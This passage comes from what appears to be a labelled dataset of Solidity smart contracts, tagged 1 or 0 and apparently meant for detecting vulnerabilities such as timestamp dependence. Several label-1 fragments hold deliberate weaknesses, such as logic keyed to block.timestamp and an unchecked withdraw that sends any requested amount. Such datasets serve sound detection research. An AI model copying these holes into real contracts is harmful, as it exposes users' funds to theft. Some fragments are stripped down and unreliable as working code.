timestamp) internal {        if (timestamp > loan.interestTimestamp) {            uint256 newInterest = loan.interest;            uint256 newPunitoryInterest = loan.punitoryInterest;            uint256 newTimestamp;            uint256 realDelta;            uint256 calculatedInterest;            uint256 deltaTime;            uint256 pending;            uint256 endNonPunitory = min(timestamp, loan.dueTime);            if (endNonPunitory > loan.interestTimestamp) {                deltaTime = endNonPunitory - loan.interestTimestamp;                if (loan.paid < loan.amount) {                    pending = loan.amount - loan.paid;                } else {                    pending = 0;                }                (realDelta, calculatedInterest) = calculateInterest(deltaTime, loan.interestRate, pending);                newInterest = safeAdd(calculatedInterest, newInterest);                newTimestamp = loan.interestTimestamp + realDelta;            }            if (timestamp > loan.dueTime) {                uint256 startPunitory = max(loan.dueTime, loan.interestTimestamp);                deltaTime = timestamp - startPunitory;                uint256 debt = safeAdd(loan.amount, newInterest);                pending = min(debt, safeSubtract(safeAdd(debt, newPunitoryInterest), loan.paid));                (realDelta, calculatedInterest) = calculateInterest(deltaTime, loan.interestRatePunitory, pending);                newPunitoryInterest = safeAdd(newPunitoryInterest, calculatedInterest);                newTimestamp = startPunitory + realDelta;            }                        if (newInterest != loan.interest || newPunitoryInterest != loan.punitoryInterest) {                loan.interestTimestamp = newTimestamp;                loan.interest = newInterest;                loan.punitoryInterest = newPunitoryInterest;            }        }    }         function addInterest(uint index) public returns (bool) {        Loan storage loan = loans[index];        require(loan.status == Status.lent);        internalAddInterest(loan, block.timestamp);    }             function pay(uint index, uint256 _amount, address _from, bytes oracleData) public returns (bool) {        Loan storage loan = loans[index];        require(loan.status == Status.lent);        addInterest(index);        uint256 toPay = min(getPendingAmount(index), _amount);        PartialPayment(index, msg.sender, _from, toPay);        loan.paid = safeAdd(loan.paid, toPay);        if (getRawPendingAmount(index) == 0) {            TotalPayment(index);            loan.status = Status.paid;                         lendersBalance[loan.lender] -= 1;            activeLoans -= 1;            Transfer(loan.lender, 0x0, index);        }        uint256 transferValue = convertRate(loan.oracle, loan.currency, oracleData, toPay);        require(transferValue > 0 || toPay < _amount);        lockTokens(rcn, transferValue);        require(rcn.transferFrom(msg.sender, this, transferValue));        loan.lenderBalance = safeAdd(transferValue, loan.lenderBalance);        return true;    }         function convertRate(Oracle oracle, bytes32 currency, bytes data, uint256 amount) public returns (uint256) {        if (oracle == address(0)) {            return amount;        } else {            uint256 rate;            uint256 decimals;                        (rate, decimals) = oracle.getRate(currency, data);            require(decimals <= RCN_DECIMALS);            return (safeMult(safeMult(amount, rate), (10**(RCN_DECIMALS-decimals)))) / PRECISION;        }    }         function withdrawal(uint index, address to, uint256 amount) public returns (bool) {        Loan storage loan = loans[index];        require(msg.sender == loan.lender);        loan.lenderBalance = safeSubtract(loan.lenderBalance, amount);        require(rcn.transfer(to, amount));        unlockTokens(rcn, amount);        return true;    }         function withdrawalList(uint256[] memory loanIds, address to) public returns (uint256) {        uint256 inputId;        uint256 totalWithdraw = 0;        for (inputId = 0; inputId < loanIds.length; inputId++) {            Loan storage loan = loans[loanIds[inputId]];            if (loan.lender == msg.sender) {                totalWithdraw += loan.lenderBalance;                loan.lenderBalance = 0;            }        }        require(rcn.transfer(to, totalWithdraw));        unlockTokens(rcn, totalWithdraw);        return totalWithdraw;    }         function setDeprecated(bool _deprecated) public onlyOwner {        deprecated = _deprecated;    }}
1<CODESPLIT>contract B0xAccount {	mapping (address => Withdraw[]) public withdrawals;    struct Withdraw {        uint amount;        uint blockNumber;        uint blockTimestamp;    }    function withdraw(uint _value) public returns(bool) {        uint amount = _value;        withdrawals[msg.sender].push(Withdraw({            amount: amount,            blockNumber: block.number,            blockTimestamp: block.timestamp        }));        return (msg.sender.send(amount));    }}
1<CODESPLIT>contract Halo3DPotPotato {    uint256 public lastBidTime;    function timePassed() public view returns(uint256 time){        if(lastBidTime == 0){            return 0;        }        return block.timestamp - lastBidTime;    }}
1<CODESPLIT>contract OutCloud {    uint256 public preico_startdate;    uint public bonusCalculationFactor;    uint disc;    function getCurrentTokenPricepreICO() private returns (uint) {        bonusCalculationFactor = (block.timestamp + (preico_startdate)) / (604800);        if (bonusCalculationFactor== 0)            disc = 30;        return disc;  }}
0<CODESPLIT>contract DateTime {                 struct _DateTime {                uint16 year;                uint8 month;                uint8 day;                uint8 hour;                uint8 minute;                uint8 second;                uint8 weekday;        }        uint constant DAY_IN_SECONDS = 86400;        uint constant YEAR_IN_SECONDS = 31536000;        uint constant LEAP_YEAR_IN_SECONDS = 31622400;        uint constant HOUR_IN_SECONDS = 3600;        uint constant MINUTE_IN_SECONDS = 60;        uint16 constant ORIGIN_YEAR = 1970;        function isLeapYear(uint16 year) public pure returns (bool) {                if (year % 4 != 0) {                        return false;                }                if (year % 100 != 0) {                        return true;                }                if (year % 400 != 0) {                        return false;                }                return true;        }        function leapYearsBefore(uint year) public pure returns (uint) {                year -= 1;                return year / 4 - year / 100 + year / 400;        }        function getDaysInMonth(uint8 month, uint16 year) public pure returns (uint8) {                if (month == 1 || month == 3 || month == 5 || month == 7 || month == 8 || month == 10 || month == 12) {                        return 31;                }                else if (month == 4 || month == 6 || month == 9 || month == 11) {                        return 30;                }                else if (isLeapYear(year)) {                        return 29;                }                else {                        return 28;                }        }        function parseTimestamp(uint timestamp) internal pure returns (_DateTime dt) {                uint secondsAccountedFor = 0;                uint buf;                uint8 i;                                 dt.year = getYear(timestamp);                buf = leapYearsBefore(dt.year) - leapYearsBefore(ORIGIN_YEAR);                secondsAccountedFor += LEAP_YEAR_IN_SECONDS * buf;                secondsAccountedFor += YEAR_IN_SECONDS * (dt.year - ORIGIN_YEAR - buf);                                 uint secondsInMonth;                for (i = 1; i <= 12; i++) {                        secondsInMonth = DAY_IN_SECONDS * getDaysInMonth(i, dt.year);                        if (secondsInMonth + secondsAccountedFor > timestamp) {                                dt.month = i;                                break;                        }                        secondsAccountedFor += secondsInMonth;                }                                 for (i = 1; i <= getDaysInMonth(dt.month, dt.year); i++) {                        if (DAY_IN_SECONDS + secondsAccountedFor > timestamp) {                                dt.day = i;                                break;                        }                        secondsAccountedFor += DAY_IN_SECONDS;                }                                 dt.hour = getHour(timestamp);                                 dt.minute = getMinute(timestamp);                                 dt.second = getSecond(timestamp);                                 dt.weekday = getWeekday(timestamp);        }        function getYear(uint timestamp) public pure returns (uint16) {                uint secondsAccountedFor = 0;                uint16 year;                uint numLeapYears;                                 year = uint16(ORIGIN_YEAR + timestamp / YEAR_IN_SECONDS);                numLeapYears = leapYearsBefore(year) - leapYearsBefore(ORIGIN_YEAR);                secondsAccountedFor += LEAP_YEAR_IN_SECONDS * numLeapYears;                secondsAccountedFor += YEAR_IN_SECONDS * (year - ORIGIN_YEAR - numLeapYears);                while (secondsAccountedFor > timestamp) {                        if (isLeapYear(uint16(year - 1))) {                                secondsAccountedFor -= LEAP_YEAR_IN_SECONDS;                        }                        else {                                secondsAccountedFor -= YEAR_IN_SECONDS;                        }                        year -= 1;                }                return year;        }        function getMonth(uint timestamp) public pure returns (uint8) {                return parseTimestamp(timestamp).month;        }        function getDay(uint timestamp) public pure returns (uint8) {                return parseTimestamp(timestamp).day;        }        function getHour(uint timestamp) public pure returns (uint8) {                return uint8((timestamp / 60 / 60) % 24);        }        function getMinute(uint timestamp) public pure returns (uint8) {                return uint8((timestamp / 60) % 60);        }        function getSecond(uint timestamp) public pure returns (uint8) {                return uint8(timestamp % 60);        }        function getWeekday(uint timestamp) public pure returns (uint8) {                return uint8((timestamp / DAY_IN_SECONDS + 4) % 7);        }        function toTimestamp(uint16 year, uint8 month, uint8 day) public pure returns (uint timestamp) {                return toTimestamp(year, month, day, 0, 0, 0);        }        function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour) public pure returns (uint timestamp) {                return toTimestamp(year, month, day, hour, 0, 0);        }        function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour, uint8 minute) public pure returns (uint timestamp) {                return toTimestamp(year, month, day, hour, minute, 0);        }        function toTimestamp(uint16 year, uint8 month, uint8 day, uint8 hour, uint8 minute, uint8 second) public pure returns (uint timestamp) {                uint16 i;                                 for (i = ORIGIN_YEAR; i < year; i++) {                        if (isLeapYear(i)) {                                timestamp += LEAP_YEAR_IN_SECONDS;                        }                        else {                                timestamp += YEAR_IN_SECONDS;                        }                }                                 uint8[12] memory monthDayCounts;                monthDayCounts[0] = 31;                if (isLeapYear(year)) {                        monthDayCounts[1] = 29;                }                else {                        monthDayCounts[1] = 28;                }                monthDayCounts[2] = 31;                monthDayCounts[3] = 30;                monthDayCounts[4] = 31;                monthDayCounts[5] = 30;                monthDayCounts[6] = 31;                monthDayCounts[7] = 31;                monthDayCounts[8] = 30;                monthDayCounts[9] = 31;                monthDayCounts[10] = 30;                monthDayCounts[11] = 31;                for (i = 1; i < month; i++) {                        timestamp += DAY_IN_SECONDS * monthDayCounts[i - 1];                }                                 timestamp += DAY_IN_SECONDS * (day - 1);                                 timestamp += HOUR_IN_SECONDS * (hour);                                 timestamp += MINUTE_IN_SECONDS * (minute);                                 timestamp += second;                return timestamp;        }}
0<CODESPLIT>contract DetherBank is ERC223ReceivingContract, Ownable, SafeMath, DateTime {  using BytesLib for bytes;     event receiveDth(address _from, uint amount);  event receiveEth(address _from, uint amount);  event sendDth(address _from, uint amount);  event sendEth(address _from, uint amount);  mapping(address => uint) public dthShopBalance;  mapping(address => uint) public dthTellerBalance;  mapping(address => uint) public ethShopBalance;  mapping(address => uint) public ethTellerBalance;           mapping(address => mapping(uint16 => mapping(uint16 => mapping(uint16 => uint256)))) ethSellsUserToday;  ERC223Basic public dth;  bool public isInit = false;     function setDth (address _dth) external onlyOwner {    require(!isInit);    dth = ERC223Basic(_dth);    isInit = true;  }        function withdrawDthTeller(address _receiver) external onlyOwner {    require(dthTellerBalance[_receiver] > 0);    uint tosend = dthTellerBalance[_receiver];    dthTellerBalance[_receiver] = 0;    require(dth.transfer(_receiver, tosend));  }     function withdrawDthShop(address _receiver) external onlyOwner  {    require(dthShopBalance[_receiver] > 0);    uint tosend = dthShopBalance[_receiver];    dthShopBalance[_receiver] = 0;    require(dth.transfer(_receiver, tosend));  }     function withdrawDthShopAdmin(address _from, address _receiver) external onlyOwner  {    require(dthShopBalance[_from]  > 0);    uint tosend = dthShopBalance[_from];    dthShopBalance[_from] = 0;    require(dth.transfer(_receiver, tosend));  }     function addTokenShop(address _from, uint _value) external onlyOwner {    dthShopBalance[_from] = SafeMath.add(dthShopBalance[_from], _value);  }     function addTokenTeller(address _from, uint _value) external onlyOwner{    dthTellerBalance[_from] = SafeMath.add(dthTellerBalance[_from], _value);  }     function addEthTeller(address _from, uint _value) external payable onlyOwner returns (bool) {    ethTellerBalance[_from] = SafeMath.add(ethTellerBalance[_from] ,_value);    return true;  }     function getDateInfo(uint timestamp) internal view returns(_DateTime) {         _DateTime memory date = parseTimestamp(timestamp);    return date;  }     function withdrawEth(address _from, address _to, uint _amount) external onlyOwner {    require(ethTellerBalance[_from] >= _amount);    ethTellerBalance[_from] = SafeMath.sub(ethTellerBalance[_from], _amount);    uint256 weiSoldToday = getWeiSoldToday(_from);    _DateTime memory date = getDateInfo(block.timestamp);         ethSellsUserToday[_from][date.day][date.month][date.year] = SafeMath.add(weiSoldToday, _amount);    _to.transfer(_amount);  }     function refundEth(address _from) external onlyOwner {    uint toSend = ethTellerBalance[_from];    if (toSend > 0) {      ethTellerBalance[_from] = 0;      _from.transfer(toSend);    }  }     function getDthTeller(address _user) public view returns (uint) {    return dthTellerBalance[_user];  }  function getDthShop(address _user) public view returns (uint) {    return dthShopBalance[_user];  }  function getEthBalTeller(address _user) public view returns (uint) {    return ethTellerBalance[_user];  }     function getWeiSoldToday(address _user) public view returns (uint256 weiSoldToday) {         _DateTime memory date = getDateInfo(block.timestamp);    weiSoldToday = ethSellsUserToday[_user][date.day][date.month][date.year];  }           function tokenFallback(address _from, uint _value, bytes _data) {    require(msg.sender == address(dth));  }}
1<CODESPLIT>contract Safe {    address public owner;    uint256 public lock;    function withdrawal( address to, uint value) returns (bool) {        require(msg.sender == owner);        require(block.timestamp >= lock);        require(to != address(0));        return true;    }}
1<CODESPLIT>contract EscrowContract {    address public buyer;    uint256 public amount;    uint256 public fee;    uint256 public dispute_end;    function fifty_fifty() public {        if (block.timestamp < dispute_end) throw;        uint256 buyer_amount = uint256(amount * 50)/100;        buyer_amount = buyer_amount + fee;        if (buyer_amount > 0)            if (!buyer.send(buyer_amount)) throw;        return;    }}
1<CODESPLIT>contract DeCenterToken{    uint public cTime = 0;    function time() constant returns (uint) {        if(cTime > 0) {            return cTime;        }        return block.timestamp;    }}
1<CODESPLIT>contract AdditionalToken{    address public owner;    uint256 public maxProportion;    uint256 public totalSupply;    mapping(uint256 => uint256) public maxAmountPer;    modifier onlyOwner {        require(msg.sender == owner);        _;    }    function mint(address _to, uint256 _amount) onlyOwner public returns (bool) {        uint256 curTime = block.timestamp;        uint256 curTimes = curTime / (31536000);        if(maxAmountPer[curTimes] == 0) {            maxAmountPer[curTimes] = totalSupply * (maxProportion) / (100);        }        return true;    }}
0<CODESPLIT>contract SicBo is Owned {    using SafeMath for uint;    uint public LimitBottom = 0.05 ether;    uint public LimitTop = 0.2 ether;        address public Drawer;    struct Game {        bytes32 Bets;        bytes32 SecretKey_P;        bool isPlay;        bool isPay;        uint Result;        uint Time;        address Buyer;    }        mapping (bytes32 => Game) public TicketPool;        event SubmitTicket(bytes32 indexed SecretKey_D_hash, uint Bet_amount, bytes32 Bet, bytes32 SecretKey_P, address Player);       event Result(bytes32 indexed SecretKey_D_hash, bytes32 indexed SecretKey_D,address indexed Buyer, uint Dice1, uint Dice2, uint Dice3, uint Game_Result, uint time);    event Pay(bytes32 indexed SecretKey_D_hash, address indexed Buyer, uint Game_Result);    event Owe(bytes32 indexed SecretKey_D_hash, address indexed Buyer, uint Game_Result);    event OwePay(bytes32 indexed SecretKey_D_hash, address indexed Buyer, uint Game_Result);        function SicBo (address drawer_) public {        Drawer = drawer_;    }        function submit(bytes32 Bets, bytes32 secretKey_P, bytes32 secretKey_D_hash) payable public {                require(TicketPool[secretKey_D_hash].Time == 0);        require(msg.value >= LimitBottom && msg.value <= LimitTop);        uint  bet_total_amount = 0;        for (uint i = 0; i < 29; i++) {            if(Bets[i] == 0x00) continue;                        uint bet_amount_ = uint(Bets[i]).mul(10000000000000000);            bet_total_amount = bet_total_amount.add(bet_amount_);        }                if(bet_total_amount == msg.value){            SubmitTicket(secretKey_D_hash, msg.value, Bets, secretKey_P, msg.sender);            TicketPool[secretKey_D_hash] = Game(Bets,secretKey_P,false,false,0,block.timestamp,msg.sender);        }else{            revert();        }            }        function award(bytes32 secretKey_D) public {                require(Drawer == msg.sender);                bytes32 secretKey_D_hash = keccak256(secretKey_D);                Game local_ = TicketPool[secretKey_D_hash];                require(local_.Time != 0 && !local_.isPlay);                uint dice1 = uint(keccak256("Pig World ia a Awesome game place", local_.SecretKey_P, secretKey_D)) % 6 + 1;        uint dice2 = uint(keccak256(secretKey_D, "So you will like us so much!!!!", local_.SecretKey_P)) % 6 + 1;        uint dice3 = uint(keccak256(local_.SecretKey_P, secretKey_D, "Don't think this is unfair", "Our game are always provably fair...")) % 6 + 1;            uint amount = 0;        uint total = dice1 + dice2 + dice3;                for (uint ii = 0; ii < 29; ii++) {            if(local_.Bets[ii] == 0x00) continue;                        uint bet_amount = uint(local_.Bets[ii]) * 10000000000000000;                        if(ii >= 23)                if (dice1 == ii - 22 || dice2 == ii - 22 || dice3 == ii - 22) {                    uint8 count = 1;                    if (dice1 == ii - 22) count++;                    if (dice2 == ii - 22) count++;                    if (dice3 == ii - 22) count++;                    amount += count * bet_amount;                }            if(ii <= 8)                if (dice1 == dice2 && dice2 == dice3 && dice1 == dice3) {                    if (ii == 8) {                        amount += 31 * bet_amount;                    }                        if(ii >= 2 && ii <= 7)                        if (dice1 == ii - 1) {                            amount += 181 * bet_amount;                        }                    } else {                                        if (ii == 0 && total <= 10) {                        amount += 2 * bet_amount;                    }                                        if (ii == 1 && total >= 11) {                        amount += 2 * bet_amount;                    }                }                            if(ii >= 9 && ii <= 22){                if (ii == 9 && total == 4) {                    amount += 61 * bet_amount;                }                if (ii == 10 && total == 5) {                    amount += 31 * bet_amount;                }                if (ii == 11 && total == 6) {                    amount += 18 * bet_amount;                }                if (ii == 12 && total == 7) {                    amount += 13 * bet_amount;                }                if (ii == 13 && total == 8) {                    amount += 9 * bet_amount;                }                if (ii == 14 && total == 9) {                    amount += 8 * bet_amount;                }                if (ii == 15 && total == 10) {                    amount += 7 * bet_amount;                }                if (ii == 16 && total == 11) {                    amount += 7 * bet_amount;                }                if (ii == 17 && total == 12) {                    amount += 8 * bet_amount;                }                if (ii == 18 && total == 13) {                    amount += 9 * bet_amount;                }                if (ii == 19 && total == 14) {                    amount += 13 * bet_amount;                }                if (ii == 20 && total == 15) {                    amount += 18 * bet_amount;                }                if (ii == 21 && total == 16) {                    amount += 31 * bet_amount;                }                if (ii == 22 && total == 17) {                    amount += 61 * bet_amount;                }            }        }                Result(secretKey_D_hash, secretKey_D, TicketPool[secretKey_D_hash].Buyer, dice1, dice2, dice3, amount, block.timestamp);        TicketPool[secretKey_D_hash].isPlay = true;                if(amount != 0){            TicketPool[secretKey_D_hash].Result = amount;            if (address(this).balance >= amount && TicketPool[secretKey_D_hash].Buyer.send(amount)) {                TicketPool[secretKey_D_hash].isPay = true;                Pay(secretKey_D_hash,TicketPool[secretKey_D_hash].Buyer, amount);            } else {                Owe(secretKey_D_hash, TicketPool[secretKey_D_hash].Buyer, amount);                TicketPool[secretKey_D_hash].isPay = false;            }          } else {            TicketPool[secretKey_D_hash].isPay = true;        }            }        function () public payable {           }        function withdraw(uint withdrawEther_) public onlyOwner {        msg.sender.transfer(withdrawEther_);    }        function changeLimit(uint _bottom, uint _top) public onlyOwner {        LimitBottom = _bottom;        LimitTop = _top;    }        function changeDrawer(address drawer_) public onlyOwner {        Drawer = drawer_;    }        function getisPlay(bytes32 secretKey_D_hash) public constant returns (bool isplay){        return TicketPool[secretKey_D_hash].isPlay;    }        function getTicketTime(bytes32 secretKey_D_hash) public constant returns (uint Time){        return TicketPool[secretKey_D_hash].Time;    }        function chargeOwe(bytes32 secretKey_D_hash) public {        require(!TicketPool[secretKey_D_hash].isPay);        require(TicketPool[secretKey_D_hash].isPlay);        require(TicketPool[secretKey_D_hash].Result != 0);                if(address(this).balance >= TicketPool[secretKey_D_hash].Result){            if (TicketPool[secretKey_D_hash].Buyer.send(TicketPool[secretKey_D_hash].Result)) {                TicketPool[secretKey_D_hash].isPay = true;                OwePay(secretKey_D_hash, TicketPool[secretKey_D_hash].Buyer, TicketPool[secretKey_D_hash].Result);            }        }     }}
0<CODESPLIT>contract NullFinalizeAgent is FinalizeAgent {  Crowdsale public crowdsale;  function NullFinalizeAgent(Crowdsale _crowdsale) {    crowdsale = _crowdsale;  }  function isSane() public constant returns (bool) {    return true;  }  function finalizeCrowdsale() public {  }}
0<CODESPLIT>contract AllocatedCrowdsaleMixin is CrowdsaleBase {  address public beneficiary;  function AllocatedCrowdsaleMixin(address _beneficiary) {    beneficiary = _beneficiary;  }  function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken) {    if(tokenAmount > getTokensLeft()) {      return true;    } else {      return false;    }  }  function isCrowdsaleFull() public constant returns (bool) {    return getTokensLeft() == 0;  }  function getTokensLeft() public constant returns (uint) {    return token.allowance(owner, this);  }  function assignTokens(address receiver, uint tokenAmount) internal {    if(!token.transferFrom(beneficiary, receiver, tokenAmount)) throw;  }}library BytesDeserializer {  function slice32(bytes b, uint offset) constant returns (bytes32) {    bytes32 out;    for (uint i = 0; i < 32; i++) {      out |= bytes32(b[offset + i] & 0xFF) >> (i * 8);    }    return out;  }  function sliceAddress(bytes b, uint offset) constant returns (address) {    bytes32 out;    for (uint i = 0; i < 20; i++) {      out |= bytes32(b[offset + i] & 0xFF) >> ((i+12) * 8);    }    return address(uint(out));  }  function slice16(bytes b, uint offset) constant returns (bytes16) {    bytes16 out;    for (uint i = 0; i < 16; i++) {      out |= bytes16(b[offset + i] & 0xFF) >> (i * 8);    }    return out;  }  function slice4(bytes b, uint offset) constant returns (bytes4) {    bytes4 out;    for (uint i = 0; i < 4; i++) {      out |= bytes4(b[offset + i] & 0xFF) >> (i * 8);    }    return out;  }  function slice2(bytes b, uint offset) constant returns (bytes2) {    bytes2 out;    for (uint i = 0; i < 2; i++) {      out |= bytes2(b[offset + i] & 0xFF) >> (i * 8);    }    return out;  }}
0<CODESPLIT>contract KYCPayloadDeserializer {  using BytesDeserializer for bytes;  struct KYCPayload {    address whitelistedAddress; // 20 bytes    uint128 customerId; // 16 bytes    uint32 minETH; // 4 bytes    uint32 maxETH; // 4 bytes    uint256 pricingInfo;  }  function getKYCPayload(bytes dataframe) public constant returns(address whitelistedAddress, uint128 customerId, uint32 minEth, uint32 maxEth, uint256 pricingInfo) {    address _whitelistedAddress = dataframe.sliceAddress(0);    uint128 _customerId = uint128(dataframe.slice16(20));    uint32 _minETH = uint32(dataframe.slice4(36));    uint32 _maxETH = uint32(dataframe.slice4(40));    uint256 _pricingInfo = uint256(dataframe.slice32(44));    return (_whitelistedAddress, _customerId, _minETH, _maxETH, _pricingInfo);  }}
0<CODESPLIT>contract KYCCrowdsale is AllocatedCrowdsaleMixin, KYCPayloadDeserializer {  address public signerAddress;  event SignerChanged(address signer);  function KYCCrowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, address _beneficiary) CrowdsaleBase(_token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal) AllocatedCrowdsaleMixin(_beneficiary) {  }  function buyWithKYCData(bytes dataframe, uint8 v, bytes32 r, bytes32 s) public payable returns(uint tokenAmount) {    uint _tokenAmount;    uint multiplier = 10 ** 18;    if(earlyParticipantWhitelist[msg.sender]) {      _tokenAmount = investInternal(msg.sender, 0x1000);    } else {      bytes32 hash = sha256(dataframe);      var (whitelistedAddress, customerId, minETH, maxETH, pricingInfo) = getKYCPayload(dataframe);      require(ecrecover(hash, v, r, s) == signerAddress);      require(whitelistedAddress == msg.sender);      uint256 tokensTotal = calculateTokens(msg.value, pricingInfo);      _tokenAmount = buyTokens(msg.sender, customerId, tokensTotal);    }    if(!earlyParticipantWhitelist[msg.sender]) {      require(investedAmountOf[msg.sender] >= minETH * multiplier / 10000);      require(investedAmountOf[msg.sender] <= maxETH * multiplier / 10000);    }    return _tokenAmount;  }  function setSignerAddress(address _signerAddress) onlyOwner {    signerAddress = _signerAddress;    SignerChanged(signerAddress);  }}
0<CODESPLIT>contract ValidationUtil {    function requireNotEmptyAddress(address value) internal{        require(isAddressValid(value));    }    function isAddressValid(address value) internal constant returns (bool result){        return value != 0;    }}library SafeMath {  function mul(uint256 a, uint256 b) internal constant returns (uint256) {    uint256 c = a * b;    assert(a == 0 || c / a == b);    return c;  }  function div(uint256 a, uint256 b) internal constant returns (uint256) {    uint256 c = a / b;    return c;  }  function sub(uint256 a, uint256 b) internal constant returns (uint256) {    assert(b <= a);    return a - b;  }  function add(uint256 a, uint256 b) internal constant returns (uint256) {    uint256 c = a + b;    assert(c >= a);    return c;  }}
0<CODESPLIT>contract CrowdsaleToken is StandardToken, Ownable {    string public name;    string public symbol;    uint public decimals;    address public mintAgent;    event UpdatedTokenInformation(string newName, string newSymbol);    event TokenMinted(uint amount, address toAddress);    function CrowdsaleToken(string _name, string _symbol, uint _decimals) {        owner = msg.sender;        name = _name;        symbol = _symbol;        decimals = _decimals;    }    function mintToAddress(uint amount, address toAddress) onlyMintAgent{        balances[toAddress] = amount;        TokenMinted(amount, toAddress);    }    function setTokenInformation(string _name, string _symbol) onlyOwner {        name = _name;        symbol = _symbol;        UpdatedTokenInformation(name, symbol);    }    function setMintAgent(address _address) onlyOwner {        mintAgent =  _address;    }    modifier onlyMintAgent(){        require(msg.sender == mintAgent);        _;    }}
0<CODESPLIT>contract BurnableCrowdsaleToken is BurnableToken, CrowdsaleToken {    function BurnableCrowdsaleToken(string _name, string _symbol, uint _decimals) CrowdsaleToken(_name, _symbol, _decimals) BurnableToken(){    }}
1<CODESPLIT>contract AllocatedCappedCrowdsale is Haltable, ValidationUtil {    using SafeMath for uint;    uint public advisorsTokenAmount = 8040817;    uint public supportTokenAmount = 3446064;    uint public marketingTokenAmount = 3446064;    uint public teamTokenAmount = 45947521;    uint public teamTokensIssueDate;    BurnableCrowdsaleToken public token;    address public destinationMultisigWallet;    uint public firstStageStartsAt;    uint public firstStageEndsAt;    uint public secondStageStartsAt;    uint public secondStageEndsAt;    uint public softCapFundingGoalInCents = 392000000;    uint public hardCapFundingGoalInCents = 985000000;    uint public weiRaised;    uint public firstStageRaisedInWei;    uint public secondStageRaisedInWei;    uint public investorCount;    uint public weiRefunded;    uint public tokensSold;    bool public isFirstStageFinalized;    bool public isSecondStageFinalized;    bool public isSuccessOver;    bool public isRefundingEnabled;    uint public currentEtherRateInCents;    uint public oneTokenInCents = 7;    bool public isFirstStageTokensMinted;    bool public isSecondStageTokensMinted;    uint public firstStageTotalSupply = 112000000;    uint public firstStageTokensSold;    uint public secondStageTotalSupply = 229737610;    uint public secondStageTokensSold;    uint public secondStageReserve = 60880466;    uint public secondStageTokensForSale;    mapping (address => uint) public tokenAmountOf;    mapping (address => uint) public investedAmountOf;    address public advisorsAccount;    address public marketingAccount;    address public supportAccount;    address public teamAccount;    enum State{PreFunding, FirstStageFunding, FirstStageEnd, SecondStageFunding, SecondStageEnd, Success, Failure, Refunding}    event Invested(address indexed investor, uint weiAmount, uint tokenAmount, uint centAmount, uint txId);    event ExchangeRateChanged(uint oldExchangeRate, uint newExchangeRate);    event FirstStageStartsAtChanged(uint newFirstStageStartsAt);    event FirstStageEndsAtChanged(uint newFirstStageEndsAt);    event SecondStageStartsAtChanged(uint newSecondStageStartsAt);    event SecondStageEndsAtChanged(uint newSecondStageEndsAt);    event SoftCapChanged(uint newGoal);    event HardCapChanged(uint newGoal);    function AllocatedCappedCrowdsale(uint _currentEtherRateInCents, address _token, address _destinationMultisigWallet, uint _firstStageStartsAt, uint _firstStageEndsAt, uint _secondStageStartsAt, uint _secondStageEndsAt, address _advisorsAccount, address _marketingAccount, address _supportAccount, address _teamAccount, uint _teamTokensIssueDate) {        requireNotEmptyAddress(_destinationMultisigWallet);        require(_firstStageStartsAt != 0);        require(_firstStageEndsAt != 0);        require(_firstStageStartsAt < _firstStageEndsAt);        require(_secondStageStartsAt != 0);        require(_secondStageEndsAt != 0);        require(_secondStageStartsAt < _secondStageEndsAt);        require(_teamTokensIssueDate != 0);        token = BurnableCrowdsaleToken(_token);        destinationMultisigWallet = _destinationMultisigWallet;        firstStageStartsAt = _firstStageStartsAt;        firstStageEndsAt = _firstStageEndsAt;        secondStageStartsAt = _secondStageStartsAt;        secondStageEndsAt = _secondStageEndsAt;        advisorsAccount = _advisorsAccount;        marketingAccount = _marketingAccount;        supportAccount = _supportAccount;        teamAccount = _teamAccount;        teamTokensIssueDate = _teamTokensIssueDate;        currentEtherRateInCents = _currentEtherRateInCents;        secondStageTokensForSale = secondStageTotalSupply.sub(secondStageReserve);    }    function mintTokensForFirstStage() public onlyOwner {        require(!isFirstStageTokensMinted);        uint tokenMultiplier = 10 ** token.decimals();        token.mintToAddress(firstStageTotalSupply.mul(tokenMultiplier), address(this));        isFirstStageTokensMinted = true;    }    function mintTokensForSecondStage() private {        require(!isSecondStageTokensMinted);        require(isFirstStageTokensMinted);        uint tokenMultiplier = 10 ** token.decimals();        token.mintToAddress(secondStageTotalSupply.mul(tokenMultiplier), address(this));        isSecondStageTokensMinted = true;    }    function getOneTokenInWei() external constant returns(uint){        return oneTokenInCents.mul(10 ** 18).div(currentEtherRateInCents);    }    function getWeiInCents(uint value) public constant returns(uint){        return currentEtherRateInCents.mul(value).div(10 ** 18);    }    function assignTokens(address receiver, uint tokenAmount) private {        if (!token.transfer(receiver, tokenAmount)) revert();    }    function() payable {        buy();    }    function internalAssignTokens(address receiver, uint tokenAmount, uint weiAmount, uint centAmount, uint txId) internal {        assignTokens(receiver, tokenAmount);        Invested(receiver, weiAmount, tokenAmount, centAmount, txId);    }    function internalInvest(address receiver, uint weiAmount, uint txId) stopInEmergency inFirstOrSecondFundingState notHardCapReached internal {        State currentState = getState();        uint tokenMultiplier = 10 ** token.decimals();        uint amountInCents = getWeiInCents(weiAmount);        uint bonusPercentage = 0;        uint bonusStateMultiplier = 1;        if (currentState == State.FirstStageFunding){            require(amountInCents >= 2500000);            if (amountInCents >= 2500000 && amountInCents < 5000000){                bonusPercentage = 50;            }else if(amountInCents >= 5000000 && amountInCents < 10000000){                bonusPercentage = 75;            }else if(amountInCents >= 10000000){                bonusPercentage = 100;            }else{                revert();            }        } else if(currentState == State.SecondStageFunding){            bonusStateMultiplier = 10;            uint tokensSoldPercentage = secondStageTokensSold.mul(100).div(secondStageTokensForSale.mul(tokenMultiplier));            require(amountInCents >= 700);            if (tokensSoldPercentage >= 0 && tokensSoldPercentage < 10){                bonusPercentage = 200;            }else if (tokensSoldPercentage >= 10 && tokensSoldPercentage < 20){                bonusPercentage = 175;            }else if (tokensSoldPercentage >= 20 && tokensSoldPercentage < 30){                bonusPercentage = 150;            }else if (tokensSoldPercentage >= 30 && tokensSoldPercentage < 40){                bonusPercentage = 125;            }else if (tokensSoldPercentage >= 40 && tokensSoldPercentage < 50){                bonusPercentage = 100;            }else if (tokensSoldPercentage >= 50 && tokensSoldPercentage < 60){                bonusPercentage = 80;            }else if (tokensSoldPercentage >= 60 && tokensSoldPercentage < 70){                bonusPercentage = 60;            }else if (tokensSoldPercentage >= 70 && tokensSoldPercentage 